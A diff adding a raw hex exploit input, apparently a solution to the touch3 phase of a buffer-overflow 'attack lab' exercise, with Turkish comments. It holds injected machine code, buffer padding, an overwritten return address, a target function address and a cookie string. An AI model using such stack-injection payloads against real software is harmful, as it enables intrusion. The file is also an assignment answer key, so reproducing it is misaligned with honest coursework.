@@ -1,0 +1,14 @@
+48 c7 c7 b0 04 67 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+%rsp kaydedicisinden bufferın boyutun çıkartıyoruz. %rsp value - 0x28 
+78 04 67 55 00 00 00 00
+
+//tocuh 3 ün adresi
+7c 19 40 00 00 00 00 00
+
+//cookie değerimizin ascii karşılığı
+35 63 64 36 31 65 66 31 00
